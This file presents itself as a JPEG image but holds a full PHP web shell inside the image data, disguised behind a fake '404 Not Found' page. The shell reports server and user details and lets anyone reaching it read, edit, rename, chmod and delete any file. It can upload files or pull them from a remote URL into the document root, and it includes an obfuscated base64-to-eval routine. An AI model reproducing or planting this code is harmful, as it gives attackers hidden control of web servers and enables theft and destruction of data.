���� JFIF      ��1&<!DOCTYPE html>
<html>
<head>
	<title>404 Not Found</title>
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<font face="Bungee" size="5">Yohohohohohooho | Sanrei Aya </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://avatars.githubusercontent.com/u/95851554" width="280" height="280" title="Yohohohohohooho" alt="Sanrei Aya" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>Yohohohohohooho | Sanrei Aya</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['path'])) {
		$lokasi = $_GET['path'];
	} else {
		$lokasi = getcwd();
	}
	if (is_writable($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function cekroot() {
	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".php_uname()."</font><br>";
echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "Directory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = stripslashes($value);
}

function b_start(){	
	$b_start = "aGVsbG8=";
	$b_start = base64_decode($b_start);$b_start = base64_decode($b_start);$b_start = base64_decode($b_start);
	eval($b_start);
}

if(isset($_GET['path'])){
	$lokasi = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$lokasi = getcwd();
	$lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);
b_start();
foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}
echo '<center>';
echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
			echo "<font color='red'>Failed to Upload !<br><br>";
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			exit("Filename cannot be empty !");
		}
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
			echo "<font coloe='red'>Failed to Upload !<br><br>";
		}
	}
}
echo "<center>";
echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://Mirror-H.xyz/">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</center>
</form>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
	echo "<tr><td>Current File : ".$_GET['fileloc'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
	author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
	if (is_dir($_POST['path'])) {
		xrmdir($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
			echo "string";
		}
	} elseif (is_file($_POST['path'])) {
		@unlink($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
	if (isset($_POST['chm0d'])) {
		$cm = @chmod($_POST['path'], $_POST['perm']);
		if ($cm == true) {
			green("Change Mod Success !");
		} else {
			red("Change Mod Failed !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
	if (isset($_POST['gantin'])) {
		$ren = @rename($_POST['path'], $_POST['newname']);
		if ($ren == true) {
			green("Change Name Success !");
		} else {
			red("Change Name Failed !");
		}
	}
	if (empty($_POST['name'])) {
		$namaawal = $_POST['newname'];
	} else {
		$namawal = $_POST['name'];
	}
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @file_put_contents($_POST['path'], $_POST['src']);
		if ($edit == true) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>".$_POST['path']."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
	echo "<tr>
	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
	echo statusnya($lokasi."/".$dir);
	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
	if(!is_file("$lokasi/$file")) continue;
	$size = filesize("$lokasi/$file")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</center></form></td>
</tr>";
}
echo '</tr></td></table></table>';
author();
function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>
�� � 		''#*" "*#>1++1>H<9<HWNNWmhm���		''#*" "*#>1++1>H<9<HWNNWmhm����� R" ��             ��     ��                                                                                                                                                                                                                                                                                                           K3 (            �zt���           ,+$ �o           ��h 3OD�          6n �                                     $�0 ��7Jb          �|z��o�s��J��         �2|��m�����G|�         u�?���<�'�
�         2�@�ֱa�����         3v�G6����nɓ���         �����P�fz�D� ��          ���u�U�5 �K�           ` 2                                     ��� f           ��* ���           �^�`S�           �a��%�           � d                                                                                                                                                                                                                                                                                              �            ��              ��    �                                                                            �Wf3��y     	kh�     �     ^��u     :o>�D�96���x     ,��es���j&�    �v�������    w2}!�           +c     =]�MP                                                                                   ��             ��    �                                                                             ���Ѿ�    �� �[�    �     #u�2� Op    �+�3=t�רUzT�    �L�e��u�G     ��2wYϊ�;XtK    "]���z�            �h{h     |r������     �                                                                             �� $           `0����   �,��0L�0L�0GO�mm��}5�ZK�l����#�&�KJQEQEQEQD4�Q|����������������������k}��`�`�`���/�cc}��%��$~j�5%~�4%�$�!*G�d$|aWj��T�ZrW�y&>I/F�����Y��1Ih%��z$yb�uE�WoT��Sr1��S�M�~�J�.�M䖜c𚚟��M������ss�b2K7��W�g��{{���[gL��������������^n0��i��i��i���ԘE���n��n��n��k�G�4U��S��i!Kow��X�a�EQEQ@ܪ�w�8�8�8�C�{!B�!B�!B�!B�!B�!B�!B�!B�!B�!B�!B�!B�!B�!�� < 
     R�Ta��!1AS� "0QU`��bq2����#����  ? � ����L�R��D��sr��Ղ����yV�Vs�X.�[� 6yV�V��X.�[�g�`�Eg1�U����yV�V��X.�[� 6yV�Vs�X.�Y�g�`�Eo1�UB*��@�e(��@=�n�Yl.{�k@�$��L���iG[ǽ+�o?9��`toik�{#"�^!53���h�sa�s�+�9Zb%��}ߏ��G2����{�;\߶��k������g��&���MdEZ::�紩,w���
��p*K��,w���
��p*K��,w���
��p*K��,w���
�C�Q�q+#"��7����}�,N.�G���mqi��u*ݪ~c�n�?1ʷj���[�O�r�ڧ�9V�S��v���U�T��*ݪ~c�n�?1ʷj���[�O�r�ڧ�9V�S��v���U�T��*�@O#�9��5?��ȞGN`�,�H08���HP}VN@�(>�'$y�U���2��r[�P}VNK|����o�A�Y9-�(>�'%�e�d�̠������U��<����eL����c��D�,*t(�� ��1���$�STJȡ��H��5���X�6=d�h�0`o��y$w��f����t���n���ऄ�؛�7�O��$� �z�2VG�t�UKp$F?k��ҫ��KcLo���{c��s�rh$���
�l��^i��7#!�>#;ai�#2O�%d���.dm>�(��w[�?j�~'+}���77���D��$�2�6D�Z����,K%�ey�{��߳�y9����V}V�@2�w,?ip2s�����ä��zv{��o�����?iI�bҴ���#�`�*8���`llhkZ;  >' 3+�sa����FA�� 'w,Sc�!�������dw�N�)%����mj�0��49͖Fg��^߫Պ�[� �������J*<E�K������������,<�9��/�ڱLC�n�h,���'.�����]��g�?�yX^�{#���� H?�w"I'�26a���9I�X��?i� U�X���&M��~}�;nuS���z�?��Vt�Ζi�R7�fI�'3��8�(A�.�=�I�Y� ���8�I�S�  �Q'2s?:Y�g9EK����T��s�Ns|��p��}�p�F9\]�_�L�i�!�#0GX ��t^���Fc{\��\�8�i��\�ʟ#��\�ˉ$��$�8�(��`%��dw���6��%VUsoFӸw���   :����gn��OJ]�>_�iY������z��wk�h���G���Ǐ � ���%|�H�$wk��I���3U�"�323%�l`�. �S�d�1Z�<13D�,5�ll��c2k���
�۩y�������ڠ۩y�������ڠ۩y�������ڠ۩y�������ڠ۩y�����������^s?j���j��`�o�������@'�9�s�I.$�z�'����=��[�6��M��mo�[�6��M��mo�[�6��M��mo�[�� � E�y����q�{�.!ť��,��
~r�<)�� ��,��
~r�<)�� ��,��
~r�<)�� ��,��
~r�<)�� �����R�1�����\}��o��� A+�������C=\���[s�cT�3�<��I#��~d���rᘄL̆��ۘ{B�h��'t����?0Fc�z�w���`�$�'y�w��arH���W1>��Ik�)-w%�व������pRZ�
K]�Ik�)-w��+s����6E�G�� ���C��%�J��7�(o�P�ġ��C��%�J����۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩Q۩_�� 4         QST�!1PR "2Aaq��#`r���� ? �� �,.@�����{��M���4�ƛCˬi�<�ƙCˬO��^S�r�����R����yvK����O��a���q��3�f��7�n#��B}��ˮG��͹�͹�͹�͹�͹�͹�͹����M\�.Q*~�4���#K���4���#K���4��� ��\ɰ� %�,H6�jI�01D$(� y]-;TOYc�� �r�Z*(���&*�zy7T���<T�TT���_H��Rf�l�б�\E���}#�T�@��.�1_v� ���ʰ4�ػ�w&���)�����X�MM�l���r�L`�����R��٪�J�.J���G�ۋ���b��}?��a�F��I����V#ML,�v��*g��6�Vv
��| �\��<���)��\��(�qj��f�D���^�W�,��@���)�/w[K��7771���S��
u1���S��
u1���S1��FQ-T���ǅ{��2��V-��u.�#N��Ӥi�\�t�:��N��Qr��4�.]:F�E˧HŖ�HYR��s�H˕�2�b��j$+߿��Qq�\o���>zI���(��^tטǽ���-�E��oٯ�� :        !T1APQR�� "aq�#2����`bs���� ? �q,v����ӲD��.��kl�\��qN.J�8�%m�S����)��V��!񴓻�>�QȒF�!�Xϫ���ޡ	&��c��������������8�`lݷ���uqU<��N�D�
�N�D�
�N�D�
�Nࠪ9�um�1�Z�b��'�+�+�8G�?�r�⾇�P�W��U�#��ʹC�q_C�P�$���'�o�H��0�
���e����%�U������Ĳ��f��v��dydy��I'�}�����z��Xo?!V8U���(�~�ooE�յ�z��|z~U��if���o�O,�9wr�Nd����jX��~���V��pnb��Q�>$���L���o�0[+,�&�����i�3$�*(�&����,����
��i�2K#;�s���	�Ʊ��q��U����͕G�'��TA#V8E�����:]�
��,�5]Ǯ�����=IH^G
������'�3K5�=����\��]I�<����t{�5��u��G�W�0�u%�E�X�4   2�s��@=��������$n�� !\���rN-�5�88���$����\���C���*;N��@�G�{+sm<�s���mlK���kkb\d�3[[�&��ؗ7���ĸɼf��%�M�5��.2o�7�.����.ॎD�s�H��3V�5�Y5���y������m��x�{9ʭm㶷�Ǻ����fk3Y����_��